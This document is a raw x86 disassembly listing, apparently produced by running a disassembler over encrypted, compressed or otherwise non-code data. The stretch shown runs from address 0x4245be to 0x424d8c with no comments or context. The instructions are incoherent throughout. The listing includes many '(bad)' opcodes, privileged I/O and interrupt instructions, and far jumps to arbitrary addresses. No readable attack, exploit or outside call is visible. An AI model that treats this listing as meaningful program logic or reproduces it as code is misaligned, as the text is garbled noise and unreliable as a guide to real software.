  4245be:	std    
  4245bf:	and    dl,BYTE PTR [edi-0x6bd1001b]
  4245c5:	das    
  4245c6:	fldcw  WORD PTR [edi]
  4245c8:	cmp    al,0xb2
  4245ca:	scas   eax,DWORD PTR es:[edi]
  4245cb:	jae    0x42456c
  4245cd:	stc    
  4245ce:	ss xchg ebp,eax
  4245d0:	add    eax,0x7531ded4
  4245d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245d6:	cmp    eax,0x10877ff2
  4245db:	js     0x424576
  4245dd:	cli    
  4245de:	inc    ebx
  4245df:	mov    ebp,0xfad244a1
  4245e4:	mov    cl,0xcc
  4245e6:	(bad)
  4245e9:	rcr    BYTE PTR [edx],1
  4245eb:	cmc    
  4245ec:	mov    ebp,0x17c29fe9
  4245f1:	pop    ds
  4245f2:	mov    ah,0xd9
  4245f4:	fist   WORD PTR [esi+0x6e]
  4245f7:	or     cl,BYTE PTR [ebp+0x59]
  4245fa:	jecxz  0x42460b
  4245fc:	inc    ebx
  4245fd:	or     BYTE PTR [ebx],bl
  4245ff:	dec    ecx
  424600:	test   ebp,ecx
  424602:	pop    ds
  424603:	mov    bh,0x55
  424605:	das    
  424606:	outs   dx,BYTE PTR ds:[esi]
  424607:	mov    DWORD PTR [ebp+ecx*8-0x6a38d526],edx
  42460e:	loopne 0x42459a
  424610:	es cmp bl,ch
  424613:	mov    gs,WORD PTR [ecx]
  424615:	test   al,0x52
  424617:	xor    eax,0x423a07f8
  42461c:	jb     0x42460d
  42461e:	gs sub eax,0x5e22beb0
  424624:	sub    eax,0x59642408
  424629:	adc    bh,0x57
  42462c:	loopne 0x42462b
  42462e:	mov    dl,0xac
  424630:	push   ebp
  424631:	out    0xd4,eax
  424633:	sar    BYTE PTR [ecx],0x8f
  424636:	lds    eax,FWORD PTR [ebp+0x3ac26447]
  42463c:	mov    dl,0xf0
  42463e:	cdq    
  42463f:	(bad)  
  424640:	jnp    0x424616
  424642:	scas   al,BYTE PTR es:[edi]
  424643:	xchg   ecx,eax
  424644:	cmp    eax,0x5c501ab2
  424649:	call   0x821a2fcd
  42464e:	out    dx,eax
  42464f:	xchg   edx,eax
  424650:	jne    0x4245f0
  424652:	or     esp,DWORD PTR [edi-0x18bbc262]
  424658:	out    0xa8,al
  42465a:	push   edi
  42465b:	dec    ebx
  42465c:	jle    0x424620
  42465e:	mov    ebx,0x665ad807
  424663:	fcomi  st,st(4)
  424665:	cld    
  424666:	sahf   
  424667:	xlat   BYTE PTR ds:[ebx]
  424668:	test   al,0x70
  42466a:	jmp    0x6a42:0x3f924497
  424671:	std    
  424672:	lods   eax,DWORD PTR ds:[esi]
  424673:	mov    edx,0xc91575c0
  424678:	add    DWORD PTR [esi-0x4c921a8b],0xfffffff6
  42467f:	jns    0x424674
  424681:	test   al,0xff
  424683:	push   edi
  424684:	sti    
  424685:	cmp    DWORD PTR [ebp-0x68],ecx
  424688:	loope  0x424635
  42468a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42468b:	sbb    eax,DWORD PTR [ecx]
  42468d:	xchg   esp,eax
  42468e:	add    DWORD PTR [esi-0x2f5419fd],0x4e
  424695:	push   ss
  424696:	cmp    BYTE PTR [eax],bh
  424698:	mov    ebp,es
  42469a:	out    0xc1,al
  42469c:	cmp    bl,BYTE PTR [ebx-0x10505e3c]
  4246a2:	enter  0x7f76,0x82
  4246a6:	out    0x37,al
  4246a8:	sbb    ebp,DWORD PTR [edx+0x624c54e7]
  4246ae:	rcr    dl,1
  4246b0:	outs   dx,DWORD PTR ds:[esi]
  4246b1:	stos   DWORD PTR es:[edi],eax
  4246b2:	cld    
  4246b3:	(bad)  
  4246b4:	aam    0xad
  4246b6:	arpl   si,di
  4246b8:	mov    eax,ds:0xeec03e2
  4246bd:	jecxz  0x424720
  4246bf:	popa   
  4246c0:	or     cl,ah
  4246c2:	fcmove st,st(7)
  4246c4:	jg     0x424735
  4246c6:	cmp    ebx,DWORD PTR [esi-0x67]
  4246c9:	sub    al,0xe7
  4246cb:	repnz mov WORD PTR [edx],?
  4246ce:	dec    edi
  4246cf:	add    DWORD PTR [esi+0x36e9b90],ebp
  4246d5:	test   eax,0xedd2db4b
  4246da:	leave  
  4246db:	pop    ds
  4246dc:	inc    ecx
  4246dd:	and    eax,0x64f820cb
  4246e2:	pop    es
  4246e3:	xchg   ebp,eax
  4246e4:	aam    0x19
  4246e6:	and    edx,DWORD PTR [ebx+0x25]
  4246e9:	xchg   esi,eax
  4246ea:	cdq    
  4246eb:	sbb    DWORD PTR [edx],0x13
  4246ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246ef:	inc    ebx
  4246f0:	inc    edi
  4246f1:	xchg   edx,eax
  4246f2:	icebp  
  4246f3:	mov    ah,0x9c
  4246f5:	dec    ebp
  4246f6:	repz jns 0x424706
  4246f9:	pop    edx
  4246fa:	lds    eax,FWORD PTR [ebx-0x2d6b2c56]
  424700:	inc    eax
  424701:	push   es
  424702:	push   ebp
  424703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424704:	sbb    eax,0x9fccf4b6
  424709:	dec    esp
  42470a:	aas    
  42470b:	fs push ss
  42470d:	repnz pop ebx
  42470f:	dec    esi
  424710:	(bad)  
  424711:	fdiv   DWORD PTR [esi]
  424713:	popf   
  424714:	mov    ds:0xa381617b,eax
  424719:	sbb    cl,dl
  42471b:	xor    eax,0xe1d30e7a
  424720:	icebp  
  424721:	retf   
  424722:	and    dh,BYTE PTR ds:0x934269a9
  424728:	retf   
  424729:	arpl   WORD PTR [edx],bx
  42472b:	jge    0x424788
  42472d:	mov    esi,0x50afed7e
  424732:	push   0x4b
  424734:	faddp  st(6),st
  424736:	pop    ebx
  424737:	pop    edi
  424738:	jmp    0xcd7c99ca
  42473d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42473e:	inc    ebx
  42473f:	add    al,0x4b
  424741:	add    dl,BYTE PTR [ecx]
  424743:	test   BYTE PTR [ebx+eax*1+0x39],ch
  424747:	add    bh,BYTE PTR [edx+0x728eaddf]
  42474d:	pop    ds
  42474e:	sub    BYTE PTR [ecx+edi*4+0x67cad590],0x75
  424756:	sbb    ch,ch
  424758:	sub    ecx,edx
  42475a:	pushf  
  42475b:	pop    ecx
  42475c:	fstp   QWORD PTR [eax+ebp*4]
  42475f:	fistp  DWORD PTR [edx+ebp*1]
  424762:	outs   dx,BYTE PTR ds:[esi]
  424763:	fsubr  DWORD PTR [edi+0x72e1c435]
  424769:	inc    ebx
  42476a:	inc    esp
  42476b:	push   es
  42476c:	hlt    
  42476d:	sbb    bh,BYTE PTR [esi-0x1d6569a0]
  424773:	fimul  WORD PTR [eax]
  424775:	dec    ebx
  424776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424777:	xor    BYTE PTR [ecx],dl
  424779:	test   eax,0x46dfbfdf
  42477e:	aas    
  42477f:	sub    al,0xeb
  424781:	lods   al,BYTE PTR ds:[esi]
  424782:	fsub   QWORD PTR ds:0x8566c175
  424788:	push   ss
  424789:	mov    ch,0xb0
  42478b:	shr    DWORD PTR [ebx+edx*1+0x24],1
  42478f:	adc    dl,BYTE PTR [edi+0x635515ee]
  424795:	rcr    DWORD PTR [ebp-0x10],0xe7
  424799:	dec    ebx
  42479a:	popa   
  42479b:	gs enter 0x2d38,0x46
  4247a0:	sbb    al,BYTE PTR [esi]
  4247a2:	adc    eax,0x90eb4aba
  4247a7:	dec    edx
  4247a8:	jmp    0xe8332a1a
  4247ad:	rol    BYTE PTR [edi],0x86
  4247b0:	mov    dh,0xd
  4247b2:	out    dx,al
  4247b3:	mov    esi,0xa35fe07d
  4247b8:	dec    edi
  4247b9:	mov    edx,0x74821e69
  4247be:	xchg   esi,eax
  4247bf:	or     cl,BYTE PTR [eax-0x9d9f213]
  4247c5:	mov    ebp,0xdf2b2d6c
  4247ca:	xor    cl,BYTE PTR [edi-0x3e]
  4247cd:	jmp    0x42479f
  4247cf:	popf   
  4247d0:	mov    eax,0xc4394414
  4247d5:	repnz push ds
  4247d7:	cld    
  4247d8:	push   ds
  4247d9:	and    eax,0x75c62da9
  4247de:	test   DWORD PTR [esi-0x77],0xbcfe58c9
  4247e5:	call   0x34ff2ead
  4247ea:	in     al,dx
  4247eb:	push   es
  4247ec:	mov    WORD PTR [ecx],ds
  4247ee:	daa    
  4247ef:	ins    DWORD PTR es:[edi],dx
  4247f0:	sti    
  4247f1:	retw   
  4247f3:	mov    ch,0x55
  4247f5:	mov    DWORD PTR [ebp+0x37],edi
  4247f8:	ror    BYTE PTR [ebx+0x34],1
  4247fb:	ins    BYTE PTR es:[edi],dx
  4247fc:	ins    DWORD PTR es:[edi],dx
  4247fd:	fdiv   DWORD PTR [ebx+0x22]
  424800:	sub    eax,0xb7f17bc3
  424805:	jg     0x42482d
  424807:	leave  
  424808:	ror    cl,0x3a
  42480b:	sub    DWORD PTR [ebx+0x647f6777],0x8d410562
  424815:	push   cs
  424816:	call   0xffcca2cc
  42481b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42481c:	rdtsc  
  42481e:	jp     0x4247aa
  424820:	gs pop ss
  424822:	ins    DWORD PTR es:[edi],dx
  424823:	cmp    al,0x66
  424825:	fld    st(4)
  424827:	cwde   
  424828:	mov    eax,0x9e554729
  42482d:	sbb    DWORD PTR [edx+0x65],edx
  424830:	std    
  424831:	jmp    FWORD PTR [edx-0x6f0568b0]
  424837:	test   bh,cl
  424839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42483a:	jmp    0xe94a:0xe2e93dd8
  424841:	adc    ebp,DWORD PTR [edi+esi*8+0x65]
  424845:	sub    edi,ebp
  424847:	popa   
  424848:	scas   al,BYTE PTR es:[edi]
  424849:	lea    ebx,[edi+0xec5440c]
  42484f:	mov    DWORD PTR [edi+0x72],edx
  424852:	scas   al,BYTE PTR es:[edi]
  424853:	mov    eax,0x9e54618d
  424858:	jmp    0xfab5:0xcf81280b
  42485f:	sub    al,0x9
  424861:	jg     0x4248b6
  424863:	shl    ch,0x91
  424866:	fs jmp 0x42488b
  424869:	fisubr DWORD PTR [eax+edi*1-0x3e]
  42486d:	and    dh,BYTE PTR [edx]
  42486f:	std    
  424870:	push   esi
  424871:	dec    ebx
  424872:	idiv   DWORD PTR [esi-0x34]
  424875:	push   0x45
  424877:	shl    BYTE PTR ds:0x2295f8d2,0x1
  42487e:	js     0x4248d2
  424880:	jb     0x424810
  424882:	sub    ebp,esp
  424884:	cwde   
  424885:	outs   dx,DWORD PTR cs:[esi]
  424887:	bound  eax,QWORD PTR [esi+0x4]
  42488a:	stos   BYTE PTR es:[edi],al
  42488b:	fld    QWORD PTR [ebp+0x32]
  42488e:	pop    esp
  42488f:	je     0x4248e6
  424891:	mov    edx,DWORD PTR [esp+eiz*2-0x92ce14d]
  424898:	pop    ebx
  424899:	in     al,dx
  42489a:	clc    
  42489b:	jns    0x4248fa
  42489d:	mov    edx,0xbfb3a93b
  4248a2:	ins    DWORD PTR es:[edi],dx
  4248a3:	mov    edx,0xd20d11a4
  4248a8:	ds loop 0x424879
  4248ab:	xlat   BYTE PTR ds:[ebx]
  4248ac:	add    BYTE PTR [edx+ecx*1-0x47],0x6e
  4248b1:	add    al,0xdf
  4248b3:	cmp    eax,0xe20c5c9a
  4248b8:	imul   edi,DWORD PTR [edi-0x6e90cd99],0xfffffff3
  4248bf:	mov    WORD PTR [ebx-0x69abb34],ss
  4248c5:	dec    ebp
  4248c6:	(bad)  
  4248c7:	mov    ebx,0x8abb5abe
  4248cc:	mov    al,0x3d
  4248ce:	inc    ebx
  4248cf:	adc    al,0x30
  4248d1:	mov    dh,0xdc
  4248d3:	scas   al,BYTE PTR es:[edi]
  4248d4:	pop    eax
  4248d5:	adc    al,0xd8
  4248d7:	pop    edi
  4248d8:	retf   
  4248d9:	daa    
  4248da:	mov    esp,0xafe36911
  4248df:	cmp    DWORD PTR [eax],eax
  4248e1:	jecxz  0x424910
  4248e3:	xlat   BYTE PTR ds:[ebx]
  4248e4:	jle    0x424941
  4248e6:	add    BYTE PTR [ebp+edx*2+0x19],dl
  4248ea:	dec    esi
  4248eb:	inc    ebx
  4248ec:	daa    
  4248ed:	jl     0x424897
  4248ef:	loope  0x424955
  4248f1:	mov    BYTE PTR [edi],bl
  4248f3:	rol    BYTE PTR [ecx],cl
  4248f5:	popa   
  4248f6:	sub    esp,DWORD PTR [edi-0x195adeba]
  4248fc:	sub    DWORD PTR [esp+ebx*4],eax
  4248ff:	add    al,BYTE PTR [ecx-0x5bafefe6]
  424905:	arpl   WORD PTR [ebp-0x7d],ax
  424908:	xchg   edi,eax
  424909:	sbb    eax,0xcbab0083
  42490e:	in     al,dx
  42490f:	loope  0x42498d
  424911:	cld    
  424912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424913:	add    edx,esi
  424915:	mov    ecx,DWORD PTR [edx-0x6ba9be77]
  42491b:	and    al,0x77
  42491d:	mov    ds:0x364a34bb,al
  424922:	and    al,0x6d
  424924:	pop    edi
  424925:	adc    eax,0xcd5ec58a
  42492a:	(bad)  
  42492b:	int    0xa7
  42492d:	out    dx,al
  42492e:	ret    
  42492f:	aad    0xc0
  424931:	mov    ds:0xbf2366a7,al
  424936:	dec    esi
  424937:	pop    eax
  424938:	test   al,0x0
  42493a:	mov    esi,0x8a5a8a9e
  42493f:	stos   BYTE PTR es:[edi],al
  424940:	jo     0x4249b4
  424942:	(bad)  
  424943:	mov    ch,0xae
  424945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424946:	and    BYTE PTR [edx],al
  424948:	sub    DWORD PTR [edi],ebx
  42494a:	dec    edi
  42494b:	pushf  
  42494c:	dec    ecx
  42494d:	out    dx,al
  42494e:	jnp    0x4249ba
  424950:	lods   eax,DWORD PTR ds:[esi]
  424951:	icebp  
  424952:	sbb    ah,BYTE PTR es:[edi]
  424955:	imul   edx,DWORD PTR [ecx+edx*1-0x224caf7],0xd2775562
  424960:	out    dx,eax
  424961:	out    0xfd,eax
  424963:	icebp  
  424964:	pusha  
  424965:	jns    0x42493f
  424967:	ins    BYTE PTR es:[edi],dx
  424968:	lds    esp,FWORD PTR [eax+ecx*1+0x64]
  42496c:	outs   dx,BYTE PTR ds:[esi]
  42496d:	xor    DWORD PTR [ecx+0x2fbafb00],ebp
  424973:	pop    ebp
  424974:	dec    edi
  424975:	push   esi
  424976:	mov    cl,0x4d
  424978:	pushf  
  424979:	or     eax,0xa2c59d03
  42497e:	imul   edx,DWORD PTR [esi-0x5a],0xffffff90
  424982:	hlt    
  424983:	stc    
  424984:	mov    bl,BYTE PTR [eax+0x56cd5b5a]
  42498a:	call   0x9c68:0x5525acda
  424991:	fiadd  DWORD PTR [edx]
  424993:	pop    ds
  424994:	outs   dx,DWORD PTR ds:[esi]
  424995:	inc    edi
  424996:	test   eax,0xe6bef717
  42499b:	cmp    DWORD PTR [edx+0x1e8b6301],edx
  4249a1:	out    dx,eax
  4249a2:	sbb    eax,0xfa6caaff
  4249a7:	sbb    BYTE PTR [edx+0x5d],ah
  4249aa:	lods   eax,DWORD PTR ds:[esi]
  4249ab:	hlt    
  4249ac:	popa   
  4249ad:	mov    ebx,0x8819078b
  4249b2:	sub    al,0xfc
  4249b4:	repz div BYTE PTR [ebx-0x8]
  4249b8:	leave  
  4249b9:	jmp    0x4249e5
  4249bb:	clc    
  4249bc:	or     al,0xff
  4249be:	or     al,0x29
  4249c0:	sub    BYTE PTR [edi-0x9],0xcb
  4249c4:	sub    BYTE PTR [eax+ecx*2+0x367dfece],bh
  4249cb:	and    BYTE PTR [ecx+0x69],ch
  4249ce:	or     BYTE PTR ds:0x5c91707d,bl
  4249d4:	call   0xc707737
  4249d9:	jge    0x4249e4
  4249db:	loope  0x424981
  4249dd:	xchg   esi,eax
  4249de:	add    eax,0x16279889
  4249e3:	sar    BYTE PTR [ebx-0x7b],0xf9
  4249e7:	into   
  4249e8:	push   edx
  4249e9:	dec    ecx
  4249ea:	ret    0x1a46
  4249ed:	and    eax,0x7e2e15eb
  4249f2:	mov    ch,0x70
  4249f4:	hlt    
  4249f5:	aad    0x8c
  4249f7:	mov    edx,0xebc421f4
  4249fc:	je     0x4249d8
  4249fe:	daa    
  4249ff:	out    0xaa,al
  424a01:	or     DWORD PTR [esi+0x1b],ecx
  424a04:	dec    eax
  424a05:	sub    DWORD PTR [ebx-0x39e21e4b],esp
  424a0b:	add    DWORD PTR [edx+0x2990ea23],ecx
  424a11:	mov    ds:0x1db4920c,eax
  424a16:	fld    TBYTE PTR [eax]
  424a18:	mov    BYTE PTR [edi-0x5c],al
  424a1b:	pop    esi
  424a1c:	jnp    0x424a02
  424a1e:	out    dx,eax
  424a1f:	mov    cl,0xff
  424a21:	call   0x7eb8:0x1576132d
  424a28:	mov    esp,0x7e4c7d02
  424a2d:	test   ecx,edx
  424a2f:	in     al,0x6f
  424a31:	adc    al,0x5
  424a33:	out    0xc4,eax
  424a35:	inc    esi
  424a36:	inc    edi
  424a37:	ins    BYTE PTR es:[edi],dx
  424a38:	ja     0x424a58
  424a3a:	push   ds
  424a3b:	cwde   
  424a3c:	mov    eax,ds:0xab427bc4
  424a41:	adc    al,0x93
  424a43:	ret    0xbc58
  424a46:	ds ja  0x424a96
  424a49:	sti    
  424a4a:	cwde   
  424a4b:	push   ecx
  424a4c:	dec    edi
  424a4d:	bound  ecx,QWORD PTR [ebx+0x7d2014c5]
  424a53:	pusha  
  424a54:	arpl   WORD PTR fs:[ebp+0x7ac58fd5],bp
  424a5b:	pop    edx
  424a5c:	pop    esp
  424a5d:	inc    eax
  424a5e:	ret    0xa769
  424a61:	mov    esi,0xee7f91ac
  424a66:	sbb    al,0xad
  424a68:	pushf  
  424a69:	pop    edx
  424a6a:	aam    0xbe
  424a6c:	in     al,dx
  424a6d:	dec    edi
  424a6e:	test   DWORD PTR [si],eax
  424a71:	and    DWORD PTR [edx-0x37eb5d5e],edx
  424a77:	ffree  st(2)
  424a79:	push   ecx
  424a7a:	cmp    BYTE PTR [ecx-0x44],dl
  424a7d:	aaa    
  424a7e:	cmp    DWORD PTR [ebx-0x76],eax
  424a81:	jo     0x424ad3
  424a83:	shl    BYTE PTR [ebx+0x44],cl
  424a86:	jmp    0xd328:0x62b2f20b
  424a8d:	cmp    eax,DWORD PTR [ecx+0x57]
  424a90:	es or  al,dl
  424a93:	cwde   
  424a94:	and    bh,BYTE PTR [ecx+0x75]
  424a97:	xor    al,0x4b
  424a99:	add    BYTE PTR [edi-0x867ef7c],ah
  424a9f:	sahf   
  424aa0:	mov    DWORD PTR [edx+ebp*4],esi
  424aa3:	add    eax,0xa378ec41
  424aa8:	push   ebp
  424aa9:	mov    edx,DWORD PTR [edi-0x43f03e25]
  424aaf:	sub    ebp,DWORD PTR [ecx-0x14]
  424ab2:	add    eax,0xcc5bb691
  424ab7:	out    dx,al
  424ab8:	(bad)  
  424ab9:	jb     0x424aac
  424abb:	mov    WORD PTR [ecx+0x2f],?
  424abe:	mov    ss,WORD PTR [edi-0x1f5d6036]
  424ac4:	ins    DWORD PTR es:[edi],dx
  424ac5:	jne    0x424a79
  424ac7:	pop    ebp
  424ac8:	adc    DWORD PTR [ecx-0x3a14bda9],edx
  424ace:	test   BYTE PTR [ebp-0x46],bl
  424ad1:	mov    esp,0xeb6d687e
  424ad6:	xchg   esi,eax
  424ad7:	into   
  424ad8:	out    dx,eax
  424ad9:	(bad)  
  424ada:	and    ah,ch
  424adc:	sub    al,0x21
  424ade:	pusha  
  424adf:	in     eax,0x5a
  424ae1:	in     al,dx
  424ae2:	inc    ebx
  424ae3:	sbb    esi,esp
  424ae5:	push   ds
  424ae6:	aad    0xdc
  424ae8:	aas    
  424ae9:	adc    BYTE PTR [ecx-0x4a7a938e],dl
  424aef:	mov    fs,WORD PTR [ecx+ebx*8]
  424af2:	pushf  
  424af3:	pop    ss
  424af4:	ins    DWORD PTR es:[edi],dx
  424af5:	push   ss
  424af6:	fnstsw WORD PTR [eax-0x475ee560]
  424afc:	scas   eax,DWORD PTR es:[edi]
  424afd:	xchg   BYTE PTR [ebp+0x71],bl
  424b00:	(bad)  
  424b02:	adc    al,0x3e
  424b04:	cwde   
  424b05:	rcr    BYTE PTR [esi],1
  424b07:	xchg   edi,eax
  424b08:	push   ds
  424b09:	cmp    bh,BYTE PTR [eax+ebp*2]
  424b0c:	mov    cl,0x41
  424b0e:	ja     0x2f0c3293
  424b14:	cdq    
  424b15:	jo     0x424b02
  424b17:	cmc    
  424b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b19:	sub    al,0xab
  424b1b:	xchg   ecx,eax
  424b1c:	js     0x424b83
  424b1e:	loope  0x424af7
  424b20:	xchg   ah,bl
  424b22:	sti    
  424b23:	xor    al,0x6c
  424b25:	jmp    0x424b4f
  424b27:	jbe    0x424b7c
  424b29:	std    
  424b2a:	adc    eax,0x62e308b0
  424b2f:	inc    ebx
  424b30:	push   ds
  424b31:	adc    DWORD PTR [esi-0x7a],ebp
  424b34:	in     al,dx
  424b35:	and    edi,0xb186236e
  424b3b:	inc    esp
  424b3c:	aas    
  424b3d:	push   eax
  424b3e:	outs   dx,DWORD PTR ds:[esi]
  424b3f:	xor    BYTE PTR [edi],ch
  424b41:	outs   dx,DWORD PTR ds:[esi]
  424b42:	and    esi,DWORD PTR [edx+0x6]
  424b45:	(bad)  
  424b46:	sbb    eax,DWORD PTR [ecx]
  424b48:	push   0x33f4088
  424b4d:	sub    DWORD PTR [edi],edx
  424b4f:	pop    cx
  424b51:	leave  
  424b52:	sub    ebp,ebp
  424b54:	cmc    
  424b55:	test   DWORD PTR [esi+ecx*2+0x259fec9a],ebx
  424b5c:	mov    ebx,0x5a96873f
  424b61:	pop    edx
  424b62:	mov    al,0x13
  424b64:	jp     0x424bd4
  424b66:	pop    eax
  424b67:	mov    edx,0xd8d5a635
  424b6c:	pop    esi
  424b6d:	lods   al,BYTE PTR ds:[esi]
  424b6e:	ret    0xb51c
  424b71:	add    eax,0x2093a43f
  424b76:	or     DWORD PTR [edx+0x4a],eax
  424b79:	pop    edx
  424b7a:	pop    ss
  424b7b:	int3   
  424b7c:	sub    BYTE PTR [eax+0x645aa526],ah
  424b82:	fldenv [eax]
  424b84:	push   ecx
  424b85:	mov    bh,0xd6
  424b87:	adc    BYTE PTR [ebp-0x44316856],bh
  424b8d:	daa    
  424b8e:	or     al,BYTE PTR [esi]
  424b90:	push   ecx
  424b91:	addr16 in al,dx
  424b93:	cld    
  424b94:	call   0xbfa2:0x40ce9d12
  424b9b:	add    eax,0xea3325a9
  424ba0:	sub    ah,BYTE PTR [eax*2+0x1de47171]
  424ba7:	sbb    BYTE PTR [eax+0x6059a8f4],ah
  424bad:	add    al,0x99
  424baf:	shr    DWORD PTR ds:0x5d61a969,cl
  424bb5:	stos   BYTE PTR es:[edi],al
  424bb6:	cmp    ecx,ebx
  424bb8:	test   DWORD PTR [eax+0x392dc635],ebp
  424bbe:	stos   DWORD PTR es:[edi],eax
  424bbf:	sti    
  424bc0:	jnp    0x424c21
  424bc2:	sbb    al,0x7
  424bc4:	inc    ebx
  424bc5:	mov    dl,BYTE PTR [ebx]
  424bc7:	jge    0x424c06
  424bc9:	inc    ecx
  424bca:	cld    
  424bcb:	or     BYTE PTR [eax],ah
  424bcd:	push   ds
  424bce:	out    dx,al
  424bcf:	mov    al,0xf1
  424bd1:	mov    WORD PTR [edi+eax*1],cs
  424bd4:	push   ebp
  424bd5:	in     al,0xb7
  424bd7:	mov    ch,0xf6
  424bd9:	push   eax
  424bda:	mov    ds:0x72376a62,eax
  424bdf:	call   0x6f2f:0x3c8e195
  424be6:	add    eax,0xcf2f3b2c
  424beb:	mov    dl,0xed
  424bed:	push   0x7c
  424bef:	cli    
  424bf0:	adc    BYTE PTR es:[ebp-0x5a4652ff],dl
  424bf7:	imul   ebp,DWORD PTR [ebx],0xfffffff8
  424bfa:	jl     0x424c07
  424bfc:	icebp  
  424bfd:	cs (bad) 
  424bff:	cli    
  424c00:	push   esp
  424c01:	jg     0x424c74
  424c03:	fwait
  424c04:	pop    es
  424c05:	das    
  424c06:	mov    esp,0xdcc51638
  424c0b:	or     DWORD PTR [ebp-0x6f],edi
  424c0e:	mov    al,ds:0x42addfe5
  424c13:	mov    eax,0x5bd80c7c
  424c18:	push   ebp
  424c19:	sub    bh,BYTE PTR [ecx-0x72]
  424c1c:	jb     0x424c2b
  424c1e:	mov    eax,ds:0xb0e5b1b5
  424c23:	mov    ds:0xd8298a3,eax
  424c28:	mov    eax,ds:0xd4936694
  424c2d:	arpl   WORD PTR ds:0xcd6a4f8c,si
  424c33:	fxch   st(7)
  424c35:	ror    DWORD PTR [ebx],1
  424c37:	je     0x424c67
  424c39:	(bad)  
  424c3a:	xchg   esp,eax
  424c3b:	adc    al,0x1d
  424c3d:	mov    ch,0x4b
  424c3f:	call   0xc2d5060
  424c44:	sub    esi,esi
  424c46:	add    eax,0x6adc5458
  424c4b:	sub    dl,BYTE PTR ds:0x3696f6d3
  424c51:	adc    dh,BYTE PTR [edi]
  424c53:	add    bl,cl
  424c55:	sbb    al,0xa6
  424c57:	sub    BYTE PTR [bp+si+0x60],cl
  424c5b:	call   DWORD PTR [esi+0x3e]
  424c5e:	jno    0x424cb7
  424c60:	xor    DWORD PTR [edx+ebp*2-0x42b0adc6],edx
  424c67:	sbb    DWORD PTR [esi],edi
  424c69:	pop    es
  424c6a:	jb     0x424c76
  424c6c:	outs   dx,BYTE PTR ds:[esi]
  424c6d:	leave  
  424c6e:	jmp    0x424c53
  424c70:	cmp    eax,0x3fa4558
  424c75:	lock jb 0x424c34
  424c78:	(bad)  
  424c79:	fisubr WORD PTR [ebp+0x1fb7140c]
  424c7f:	xchg   edx,eax
  424c80:	shl    DWORD PTR [ebp+ebx*8-0x426cb78f],1
  424c87:	mov    eax,0xd0eb6997
  424c8c:	loope  0x424c27
  424c8e:	xchg   BYTE PTR [ebp+0x14978f79],al
  424c94:	mov    edx,0x5aa5d1c9
  424c99:	lds    esp,FWORD PTR [ecx+0x31519d4a]
  424c9f:	sbb    ebp,ecx
  424ca1:	jbe    0x424d07
  424ca3:	pusha  
  424ca4:	dec    esp
  424ca5:	inc    esi
  424ca6:	call   0xfc9d:0x2b1f5d09
  424cad:	jmp    0xd57d7924
  424cb2:	pop    ebp
  424cb3:	scas   eax,DWORD PTR es:[edi]
  424cb4:	jge    0x424c38
  424cb6:	add    al,0xa5
  424cb8:	cld    
  424cb9:	(bad)  
  424cba:	mov    esp,0xd80fec88
  424cbf:	push   eax
  424cc0:	sub    BYTE PTR ds:0xeeeb24a5,0xbf
  424cc7:	cmp    BYTE PTR [ebp+0x38],ch
  424cca:	pop    esi
  424ccb:	dec    edx
  424ccc:	mov    edx,0x18907851
  424cd1:	sbb    al,0x72
  424cd3:	and    DWORD PTR [edx+edi*8+0x37ad48d9],eax
  424cda:	push   DWORD PTR [esi]
  424cdc:	test   al,0xbf
  424cde:	in     al,dx
  424cdf:	dec    ecx
  424ce0:	mov    dl,BYTE PTR ds:[esi+0x29]
  424ce4:	add    eax,0x2bd6cd8d
  424ce9:	scas   al,BYTE PTR es:[edi]
  424cea:	jp     0x424cb1
  424cec:	jg     0x424cbe
  424cee:	retf   
  424cef:	rol    ebp,1
  424cf1:	or     DWORD PTR [edi-0x28],ebp
  424cf4:	add    ch,BYTE PTR ds:0x88627e65
  424cfa:	add    esi,eax
  424cfc:	pop    es
  424cfd:	pop    ebx
  424cfe:	sub    al,0xb5
  424d00:	mov    esp,0xdc213cd2
  424d05:	sub    eax,0xf5123cb7
  424d0a:	dec    esi
  424d0b:	xor    esi,edi
  424d0d:	xor    DWORD PTR [esi],esp
  424d0f:	dec    edi
  424d10:	xchg   ebp,eax
  424d11:	mov    ?,eax
  424d13:	dec    edi
  424d14:	add    eax,0x85b0d3c8
  424d19:	adc    al,0xf5
  424d1b:	cmp    DWORD PTR [esi+0x4f],ebx
  424d1e:	push   ss
  424d1f:	cmp    al,0x56
  424d21:	std    
  424d22:	shl    DWORD PTR ds:0x77d953f5,0xb
  424d29:	mov    cl,0x66
  424d2c:	mov    dl,0xb8
  424d2e:	cmp    eax,0x89f5e88d
  424d33:	inc    edi
  424d34:	popf   
  424d35:	inc    ebx
  424d36:	cld    
  424d37:	jl     0x424db2
  424d39:	shl    dl,cl
  424d3b:	dec    ebp
  424d3c:	shl    BYTE PTR ds:0xdd8a6c73,cl
  424d42:	sar    ebx,cl
  424d44:	sub    ebx,esp
  424d46:	fdivp  st(2),st
  424d48:	imul   ebx,ecx,0x51910491
  424d4e:	(bad)  
  424d4f:	sbb    edx,DWORD PTR [edx+edi*1]
  424d52:	repz mov ebx,0xab9cafd5
  424d58:	mov    al,0x6c
  424d5a:	mov    ?,WORD PTR [ecx+0x58ef7dd9]
  424d60:	fs nop
  424d62:	test   al,0x38
  424d64:	cmp    esp,edx
  424d66:	adc    al,0x19
  424d68:	sub    eax,0xb30390be
  424d6d:	push   0x2c
  424d6f:	fistp  WORD PTR [ecx]
  424d71:	pop    ebp
  424d72:	daa    
  424d73:	stos   BYTE PTR es:[edi],al
  424d74:	pop    ecx
  424d75:	mov    al,ds:0xc730c577
  424d7a:	push   ebx
  424d7b:	xchg   edi,eax
  424d7c:	(bad)  
  424d7d:	out    dx,eax
  424d7e:	push   ecx
  424d7f:	dec    edx
  424d80:	mov    bl,al
  424d82:	xchg   esi,eax
  424d83:	mov    fs,ebp
  424d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d86:	mov    ebp,0x794b511e
  424d8b:	dec    ecx
  424d8c:	cmc    
